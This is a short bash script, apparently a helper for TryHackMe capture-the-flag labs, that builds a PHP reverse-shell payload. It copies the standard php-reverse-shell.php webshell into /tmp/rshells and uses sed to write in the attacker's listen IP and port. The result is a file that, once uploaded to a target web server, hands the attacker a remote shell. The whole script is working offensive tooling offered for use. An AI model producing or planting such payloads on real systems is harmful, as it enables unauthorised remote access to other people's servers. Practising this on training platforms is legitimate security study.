#!/bin/bash

# Prompt for values
echo "Your IP address is:"; cat /tmp/thmip.txt
read -p "Listen address? " valueA
read -p "Listen port? " valueB

# Use the IP from the file if valueA is left blank
if [ -z "$valueA" ]; then
  valueA=$(cat /tmp/thmip.txt)
fi

# Generate temp dir
rm -f /tmp/rshells
mkdir /tmp/rshells
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/rshells/rshell.php

# Use sed to replace placeholders in the file
sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/${valueA}/" /tmp/rshells/rshell.php
sed -i "s/1234/${valueB}/" /tmp/rshells/rshell.php

# Finished output
echo "Your payload has been created:"
echo "/tmp/rshells/rshell.php"
